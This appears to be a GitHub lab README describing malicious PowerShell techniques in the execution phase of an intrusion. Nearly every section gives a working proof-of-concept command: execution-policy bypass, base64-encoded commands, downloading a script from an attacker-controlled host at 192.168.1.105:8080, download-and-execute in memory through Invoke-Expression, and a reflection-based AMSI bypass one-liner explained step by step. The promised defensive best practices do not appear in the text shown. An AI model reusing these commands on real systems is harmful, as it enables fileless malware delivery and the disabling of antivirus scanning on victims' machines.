# Scenario 

This attack falls into the execution phase of MITRE ATT&CK and requires initial access to the victim machine via phishing, credential dumping or other methods. This scenario demonstrates the different techniques and tactics attackers use when using PowerShell maliciously and details the common misconfigurations that allow these attacks to take place, and best practices to secure your network
from malicious PowerShell use.

# Attack Types
1. **Local PowerShell script Execution**
   Attacker runs a script that is hosted locally
   Execution policy is not a security feature and is used by both attackers and regular users. This command bypasses all policy execution restrictions and executes the script supplied with the file command.
   The script involves downloading a file from the internet in the script, executing it in memory it will then displaying the results without saving the downloaded file to disk. This demonstrates the ability for the attacker to create their own evil scripts and download them from attacker controlled servers where they can be run in memory without being flagged by antivirus techniques on disk
   Proof of concept: `powershell -ExecutionPolicy Bypass -File .\script.ps1`
   <img width="622" height="182" alt="image" src="https://github.com/user-attachments/assets/ceeb3da4-cb58-47cb-99e7-09c90302ee48" />
   <img width="622" height="251" alt="image" src="https://github.com/user-attachments/assets/218d315c-1032-4d95-9bdc-3c792cbc81c3" />

   


3. **Base64 Encoded Command**
   Attackers use Base64-encoded PowerShell commands primarily to:
   - Hide what the code is doing
   - Avoid detection by AV/EDR.
   - Bypass restrictions or logging.
   - Execute commands more reliably in remote or automated contexts.
  <img width="959" height="301" alt="image" src="https://github.com/user-attachments/assets/a1534f28-9cc9-4ed6-bf57-172eadd547c6" />


   Proof of concept: `$Commands = 'Invoke-WebRequest -Uri "http://192.168.1.105:8080/script.ps1"'`
   Proof of concept: `powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAMQA5ADIALgAxADYAOAAuADEALgAxADAANQA6ADgAMAA4ADAALwBzAGMAcgBpAHAAdAAuAHAAcwAxACIA`
   


  From this point the commands will be base64 encoded due to the prolific use in attacks. All commands will be executed in the same manner

3. **Download payload to disk for later use**
   Attacker will download payloads and malware for further staging and save them to disk so they can be ran later.
   <img width="849" height="437" alt="image" src="https://github.com/user-attachments/assets/ae623c89-9e75-4b62-883a-629145674136" />

   Proof of concept: `$Text = 'Invoke-WebRequest -Uri "http://192.168.1.105:8080/script.ps1" -OutFile "script.ps1"'`
   
4. **Download and Execute in Memory**
   Attackers will download scripts using the Invoke_WebRequest expression which is passed to Invoke-Expression which will execute the
   script in memory never writing any files to disk. This allows attackers to run commands and deliver full malware capabilities
   including c2 beacons.
   Proof of Concept: `$Text = "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'http://192.168.1.105:8080/script.ps1')"`
   <img width="977" height="508" alt="image" src="https://github.com/user-attachments/assets/13cf87f4-275c-4cf3-8cfd-2ff87ae05418" />

6. AMSI Bypass

 `[Ref].Assembly`

Accesses the currently running PowerShell assembly (code base).

[Ref] is a .NET class used to reflect over types.

`.GetType('System.Management.Automation.AmsiUtils')`

This loads the internal PowerShell class AmsiUtils, which handles AMSI integration.

 `.GetField('amsiInitFailed','NonPublic,Static')`

This uses .NET Reflection to access a private static field called amsiInitFailed.

That field tracks whether AMSI was successfully initialized in the process.

`.SetValue($null, $true)`

Sets the value of amsiInitFailed to $true, which tricks PowerShell into thinking AMSI has already failed.

As a result, PowerShell skips AMSI scanning for any future code in that session.
<img width="892" height="716" alt="image" src="https://github.com/user-attachments/assets/f9a73d39-e7d2-404f-b64d-7e63b1fac9f8" />

Proof of concept: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('AMSI bypass simulated.')
`

  
